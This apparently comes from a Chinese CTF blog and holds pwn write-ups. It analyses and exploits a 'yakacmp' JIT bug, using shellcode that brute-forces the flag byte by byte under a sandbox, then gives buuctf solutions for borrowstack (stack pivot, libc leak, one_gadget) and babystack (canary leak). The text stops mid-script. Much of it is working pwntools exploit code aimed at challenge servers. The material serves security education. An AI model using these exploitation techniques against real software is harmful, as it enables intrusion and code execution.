<h2 id="Segment-5"><a href="#Segment-5" class="headerlink" title="Segment 5"></a>Segment 5</h2><p><img src="https://img-blog.csdnimg.cn/cfce3ac479c848e9a7de5fe77fa13f9d.png"><br>这一个部分的上半段明显有多次调用<code>func_mov</code>函数，判断是为了处理<code>mov r**, r**</code>这样的指令。如果第二个操作数不是寄存器，会判断值是否为0，如果为0就会将<code>mov</code>指令转译为<code>xor</code>指令，含义相同。如果第二个操作数的值不为0，就会进入下面的判断，其中又调用了<code>sub_44B0</code>函数。只有调用结果满足一定条件才会进行下面的指令转译。在条件成立时，程序会将<code>mov reg, imm</code>译为<code>push imm ; pop reg</code>。但无论这段代码是否执行，下面还有一个对<code>func_movabs_8</code>函数的调用，其实现的功能就是<code>mov reg, imm</code>，即如果条件内部的代码能够执行，这里相当于是重复生成了功能相同的指令。通过<code>python</code>脚本进行反汇编发现，并不存在能够<code>push</code>一个<code>QWORD</code>的指令，代码中以<code>0x68</code>开头的指令只能够<code>push</code>一个<code>DWORD</code>入栈。因此这里的指令生成可能存在问题。我们在分析结束后再对这里进行调试检查。</p>
<h2 id="Segment-6"><a href="#Segment-6" class="headerlink" title="Segment 6"></a>Segment 6</h2><p><img src="https://img-blog.csdnimg.cn/62a246dfba6443baa6e6a72f25655850.png"><br>最后就是一些检查，循环代码的最后一小部分。当循环结束后会依条件选择插入一个<code>ret</code>指令，在执行沙箱后直接执行我们的代码。那么到此为止，我们就分析完了整个main函数的大致流程，可以知道main函数一共实现了<strong>寄存器与寄存器相加&#x2F;减、寄存器与立即数相加&#x2F;减（不大于10）、寄存器交换值、寄存器对寄存器赋值、立即数对寄存器赋值</strong>这5个功能。其中还有一些判断我们没有进行分析，重点就在于<code>sub_44B0</code>函数的分析上。我们通过进行几次调试来判断其功能。</p>
<h1 id="Step-2-调试发现sub-44B0函数的功能"><a href="#Step-2-调试发现sub-44B0函数的功能" class="headerlink" title="Step 2: 调试发现sub_44B0函数的功能"></a>Step 2: 调试发现<code>sub_44B0</code>函数的功能</h1><h2 id="测试：add-reg-imm-sub-reg-imm-ret"><a href="#测试：add-reg-imm-sub-reg-imm-ret" class="headerlink" title="测试：add reg, imm ; sub reg, imm, ret"></a>测试：<code>add reg, imm ; sub reg, imm, ret</code></h2><p>可以发现在加法和减法的代码块中都各调用了两次<code>sub_44B0</code>函数，而且调用函数之前还会初始化一个字符串。这个字符串就是指令的种类。</p>
<p><img src="https://img-blog.csdnimg.cn/62e00cf4d6584c1fb16dd4b0a5f03eda.png"><br>这是调用了sub代码最后一个<code>sub_44B0</code>（即图中最下面的这个）函数后其返回值的追踪情况。调试发现，这个函数会返回一个堆指针。<br><img src="https://img-blog.csdnimg.cn/10f9cdac8b944c318f2ed4c40151b6b4.png"><br>我们可以发现这里似乎出现了一些有规律的结构。再结合函数调用后的<code>++</code>操作，可以初步判断这里应该有一个类结构，而<code>++</code>操作可能表示的是指令计数器。但是至于为什么要将<code>mov</code>指令的计数器反复清空，目前还不清楚。</p>
<p>以这种推断，我们来看一下其他代码片段中对于这个函数的调用情况。</p>
<p>在处理<code>ret</code>指令的代码片段中，一共调用了三次<code>sub_44B0</code>函数。第一次是对<code>mov</code>指令计数器清零，第二次是将<code>ret</code>指令的计数器加1。第三次是判断<code>ret</code>指令个数是否大于0。如果大于0就会直接退出程序。那么这里可以很明显地看出一个逻辑bug。只要我们写入了<code>ret</code>指令，那么程序一定会直接退出（目前来看是这样）。</p>
<p>在处理<code>mov</code>指令的代码片段中，一共调用了两次<code>sub_44B0</code>函数。第一次是将<code>mov</code>指令的计数器加1，第二次是判断<code>mov</code>指令计数器值是否大于10。如果大于10则会插入<code>push/pop</code>指令。</p>
<p>在跳出循环之后，还会调用一次该函数判断是否有<code>ret</code>函数。如果没有则进行插入。可见我们并不需要，也不能写入一个<code>ret</code>指令。</p>
<p>如此，我们就成功获取了<code>sub_44B0</code>函数的大致语义。这也给了我们一些启示：<strong>做题时应该静态调试和动态调试相结合</strong>。</p>
<h1 id="Step-3-漏洞分析与利用"><a href="#Step-3-漏洞分析与利用" class="headerlink" title="Step 3: 漏洞分析与利用"></a>Step 3: 漏洞分析与利用</h1><p>在第一步分析main代码时我们就发现，程序对于<code>mov</code>指令的处理似乎有些问题。我们通过调试验证一下。</p>
<p>测试代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./yakacmp&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./yakacmp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_add</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;add &#x27;</span> + reg1 + <span class="string">b&#x27;,&#x27;</span> + reg2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_sub</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;sub &#x27;</span> + reg1 + <span class="string">b&#x27;,&#x27;</span> + reg2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_chg</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;chg &#x27;</span> + reg1 + <span class="string">b&#x27;,&#x27;</span> + reg2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_mov</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;mov &#x27;</span> + reg1 + <span class="string">b&#x27;,&#x27;</span> + reg2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_ret</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;ret&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_code</span>(<span class="params">code</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;more operation?&#x27;</span>, code)</span><br><span class="line"></span><br><span class="line">code = make_mov(<span class="string">b&#x27;r1&#x27;</span>, <span class="string">b&#x27;r2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;some code now&#x27;</span>, code)</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="string">b&#x27;r3&#x27;</span>))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x5212345678</span>).encode()))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/3dd0d66d959b4c53b7223b976924f5d0.png"><br>可以看到，这里确实存在问题，有一个能够容纳最多4字节shellcode的空间。问题就出在最后一条语句中的赋值立即数。这里的<code>push</code>只能压入一个<code>DWORD</code>，但代码中却认为能压入一个<code>QWORD</code>，这就导致立即数的高4字节变成了独立的指令，且能够由我们完全控制。由于本题开启了沙箱，因此通过<code>syscall</code>调用<code>execve</code>是不行了，不过我们可以进行文件的相关操作。现在，就让我们来思考一下应该如何构造shellcode。</p>
<p>通过seccomp-tools可以获取到本题的沙箱：<br><img src="https://img-blog.csdnimg.cn/e56f68ac283c493da680bbf62da6a950.png"><br>可见这里只允许我们进行打开和读操作，不能写。那我们应该如何获取到flag的值呢？阅读了大佬的exp之后，我发现这种利用方式和Web中的SQL时间盲注有几分相似之处。我们不能直接将flag写到控制台，但是我们确实能够获取到flag的值。记得时间盲注的原理就是利用字符比较函数逐字节猜解表名和字段名，这里也是同样的道理：对内存中的flag逐字节猜解。如果相等，则会阻塞一段时间，如果不等，则会直接退出报<code>EOFerror</code>。</p>
<p>参考现有的shellcode，我们需要将文件名<code>flag</code>或<code>flag.txt</code>压入栈中，然后通过<code>mov</code>指令将<code>rsp</code>的值赋值给其他寄存器。当然程序中并没有实现与<code>rsp</code>有关的指令，这就需要用到上面的4字节自由区域了。实际上如果我们跳转的地址合理，正常的<code>mov</code>指令中的8字节立即数也可以成为我们写入shellcode的地方，毕竟4个字节的空间要是想要组成一个完整的shellcode，还需要考虑跳转指令张勇的2字节，剩下的2字节能写入的shellcode实在有限，因此还需要合理利用<code>mov</code>指令的8字节立即数。考虑到上面提到的逐字节猜解，我们的shellcode需要实现的功能有：</p>
<ol>
<li>打开flag文件</li>
<li>读取flag文件到内存</li>
<li>每一次循环猜解一个字符，如果猜解正确就让其阻塞或陷入死循环，如果猜解错误就直接退出</li>
</ol>
<p>下面我们来尝试实现shellcode。<br>注意：任意4字节代码能够生成必须前面要有连续的至少10个<code>mov</code>语句。</p>
<p>首先是打开flag文件。笔者采用flag这个文件名进行测试。</p>
<ol>
<li>利用<code>mov</code>指令将<code>&quot;flag&quot;</code>字符串写入0x23330000中：<code>movabs rax, 0x67616C66 (&#39;flag&#39;)</code></li>
<li>写入9个<code>mov</code>指令：<br> (1) 写入<code>jmp</code>后执行的第九段shellcode：<code>mov rax, 0x72ebxxb1188a (mov bl, byte ptr [rax] ; mov cl, xx ; jmp 114)</code><br> (2) 写入<code>jmp</code>后执行的第八段shellcode：<code>mov rax, 0xf0ebdb314858 (pop rax ; xor rbx, rbx ;  ; jmp -16)</code><br> (3) 写入<code>jmp</code>后执行的第七段shellcode：<code>mov rax, 0xefeb23330fxx68 (push 0x23330F00 + i ; jmp -17)</code><br> (4) 写入<code>jmp</code>后执行的第六段shellcode：<code>mov rax, 0xefeb050f58006a (push 0 ; pop rax ; syscall ; jmp -17)</code><br> (5) 写入<code>jmp</code>后执行的第五段shellcode：<code>mov rax, 0xf0eb5a406a5e (pop rsi ; push 0x40 ; pop rdx ; jmp -16)</code><br> (6) 写入<code>jmp</code>后执行的第四段shellcode：<code>mov rax, 0xefeb23330f0068 (push 0x23330F00 ; jmp -17)</code><br> (7) 写入<code>jmp</code>后执行的第三段shellcode：<code>mov rax, 0xefeb5f036a050f (syscall ; push 3 ; pop rdi ; jmp -17)</code><br> (8) 写入<code>jmp</code>后执行的第二段shellcode：<code>mov rax, 0xefeb585f5e006a (push 0 ; pop rsi ; pop rdi ; pop rax ; jmp -17)</code><br> (9) 写入<code>jmp</code>后执行的第一段shellcode：<code>mov rax, 0xeeeb2333000268 (push 0x23330002 ; jmp -17)</code></li>
<li>写入<code>mov</code>指令，在4字节空间中写入跳转指令跳转到前面一条<code>mov</code>指令的立即数中，在此之前顺便<code>push</code>好<code>rax</code>的值：<code>//push// 0xF1EB00000002 (push 2 ; jmp -15)</code></li>
<li>写入<code>jmp</code>后执行的第十段shellcode：<code>mov rax, 0xfeeb1875cb38 (cmp bl, cl ; jne 23 ; jmp -2[dead loop])</code></li>
<li>写入<code>jmp</code>后执行的第十一段shellcode：<code>mov rax ; 0xc3 (ret)</code></li>
</ol>
<p>上面的代码中有两处<code>xx</code>，第一处表示猜解的字符，第二处表示猜解的是哪个下标的字符。由此我们可以写出本题的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./yakacmp&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./yakacmp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_add</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;add &#x27;</span> + reg1 + <span class="string">b&#x27;,&#x27;</span> + reg2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_sub</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;sub &#x27;</span> + reg1 + <span class="string">b&#x27;,&#x27;</span> + reg2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_chg</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;chg &#x27;</span> + reg1 + <span class="string">b&#x27;,&#x27;</span> + reg2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_mov</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;mov &#x27;</span> + reg1 + <span class="string">b&#x27;,&#x27;</span> + reg2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_ret</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;ret&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_code</span>(<span class="params">code</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;more operation?&#x27;</span>, code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    added = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>), <span class="number">0x80</span>):</span><br><span class="line">        code =    make_mov(<span class="string">b&#x27;r1&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x67616C66</span>).encode())</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;some code now&#x27;</span>, code)</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x72eb_00_b1188a</span> + (j &lt;&lt; <span class="number">24</span>)).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xf0ebdb314858</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xefeb23330f_00_68</span> + (i &lt;&lt; <span class="number">8</span>)).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xefeb050f58006a</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xf0eb5a406a5e</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xefeb23330f0068</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xefeb5f036a050f</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xefeb585f5e006a</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xefeb2333000268</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xf1eb00000002</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xfeeb1875cb38</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xc3</span>).encode()))</span><br><span class="line">        send_code(<span class="string">b&#x27;NO&#x27;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;over\n&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> io.connected():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;character #%d is not %c&#x27;</span> % (i, <span class="built_in">chr</span>(j)))</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(<span class="string">&#x27;./yakacmp&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            added = <span class="literal">True</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;character #%d : %c&#x27;</span> % (i, <span class="built_in">chr</span>(j)))</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(<span class="string">&#x27;./yakacmp&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> added:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        added = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>exp中的<code>connected</code>方法测试<code>io</code>是否正常，前面加上0.2秒的延迟给shellcode一些执行的时间。</p>
<p><img src="https://img-blog.csdnimg.cn/af2fe2cf4d7942b38ffdfdfc96321b91.png"><br>成功get flag。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/buuctf-pwn-write-ups-8/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (8)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:27:58" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:58+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="buu062-gyctf-2020-borrowstack"><a href="#buu062-gyctf-2020-borrowstack" class="headerlink" title="buu062-gyctf_2020_borrowstack"></a>buu062-gyctf_2020_borrowstack</h1><p>栈迁移。常规的栈迁移方法是返回到leave指令，之前修改rbp到合适的值。我们将rbp修改到bss段的内部，将栈迁移到这里。需要注意不能将栈迁移到变量bank的开头，因为后面还需要调用puts等函数，往上可能会覆盖某些重要数据。因此迁移的地址应该尽量靠后（下面脚本中迁移的地址是bank+0xA0）。使用puts函数读取got表，获取到libc版本，然后使用one_gadget即可getshell。（经过尝试，本题使用system(“&#x2F;bin&#x2F;sh”)不可行，原因不明）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29767</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addrsp_8_ret = <span class="number">0x4004c5</span></span><br><span class="line">pop3_ret = <span class="number">0x4006ff</span></span><br><span class="line">poprdi_ret = <span class="number">0x400703</span></span><br><span class="line">poprsi_r15_ret = <span class="number">0x400701</span></span><br><span class="line">gadget = <span class="number">0x4006FA</span></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(<span class="number">0x601080</span> - <span class="number">8</span> + <span class="number">0xA0</span>)    <span class="comment"># new ebp</span></span><br><span class="line">payload += p64(<span class="number">0x400699</span>)    <span class="comment"># leave</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Tell me what you want\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0xA0</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(poprsi_r15_ret)</span><br><span class="line">payload += p64(<span class="number">0x601080</span> + <span class="number">0x48</span> + <span class="number">0xA0</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])	<span class="comment"># 仅设定了read函数的前两个参数，第三个参数size没有设置，但是是一个很大的值</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;stack now!\n&#x27;</span>, payload)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">payload = p64(base + one_gadgets[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu063-others-babystack"><a href="#buu063-others-babystack" class="headerlink" title="buu063-others_babystack"></a>buu063-others_babystack</h1><p>简单的canary泄露栈溢出。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29017</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Input</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27; &#x27;</span>))</span><br><span class="line">    io.send(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Output</span>():</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27; &#x27;</span>))</span><br><span class="line">Input(cyclic(<span class="number">0x89</span>))</span><br><span class="line">Output()</span><br><span class="line">io.recv(<span class="number">0x88</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">canary &amp;= <span class="number">0xFFFFFFFFFFFFFF00</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x90</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">Input(payload)</span><br><span class="line">Output()</span><br><span class="line">io.recv(<span class="number">0x98</span>)</span><br><span class="line">retaddr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(retaddr))</span><br><span class="line">libc_start_main = retaddr - <span class="number">240</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main)</span><br><span 